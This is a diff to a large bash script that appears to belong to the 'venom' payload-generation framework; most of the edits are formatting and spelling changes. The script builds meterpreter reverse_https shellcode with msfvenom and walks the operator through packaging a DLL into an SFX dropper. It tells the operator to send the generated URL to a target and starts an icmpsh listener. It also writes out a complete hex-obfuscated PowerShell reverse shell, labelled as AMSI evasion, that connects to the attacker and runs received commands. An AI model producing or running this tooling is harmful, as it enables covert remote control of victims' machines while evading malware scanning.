@@ -786,9 +786,9 @@ cat << !
 
 # use metasploit to build shellcode
 if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw"
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"
 fi
 
 
@@ -1226,7 +1226,7 @@ fi
 
 
       if [ "$Ext" = "dll" ]; then
-      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with installer.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
+      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFORE CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with installer.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
       else
       N4m2="$N4m.$Ext"
       fi
@@ -11493,6 +11493,8 @@ echo "---"
 echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
 echo "- ATTACK VECTOR: http://$lhost/$N4m.bat"
 echo "---"
+echo -n "[☠] Press any key to start a handler .."
+read odf
 echo "[☠] Launching Listener, waiting for inbound connection ..";sleep 1
 cd $IPATH/bin/icmpsh
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "python icmpsh_m.py $lhost $target"
@@ -12289,7 +12291,7 @@ echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','htt
 
 
 ## Convert ip addr to hex
-echo "${BlueF}[☠]${white} Converting ip addr to hex ..${white}";sleep 2
+echo "${BlueF}[☠]${white} Converting ip address to hex ..${white}";sleep 2
 one=$(echo $lhost|cut -d '.' -f1)
 two=$(echo $lhost|cut -d '.' -f2)
 tre=$(echo $lhost|cut -d '.' -f3)
@@ -12304,7 +12306,14 @@ echo "${BlueF}[☠]${white} Obfuscated ip (hex):${GreenF}$hexed ${white}";sleep 
 
 
 ## Build Reverse Powershell Shell (obfuscated)
-echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"$ \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 5}" > $IPATH/output/$NaM.ps1
+
+
+echo "<#" > $IPATH/output/$NaM.ps1
+echo "Obfuscated (hex) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
+echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
+echo "#>" >> $IPATH/output/$NaM.ps1
+echo "" >> $IPATH/output/$NaM.ps1
+echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"$ \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 5}" >> $IPATH/output/$NaM.ps1
 
 
 ## Building Phishing webpage
